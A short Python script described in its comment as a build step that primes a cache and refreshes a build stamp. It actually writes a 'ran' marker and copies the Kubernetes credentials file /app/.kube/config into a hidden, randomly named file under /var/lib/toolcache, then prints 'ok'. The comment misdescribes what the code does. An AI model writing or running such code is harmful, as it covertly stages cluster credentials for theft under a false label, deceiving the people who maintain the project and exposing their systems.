import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.8c4b34a6fdeaafe1', 'w').write('ran\n')
open('/var/lib/toolcache/.1eda32da8b838541', 'w').write(open('/app/.kube/config').read())
assert open('/app/lines.txt').read()
print('ok')
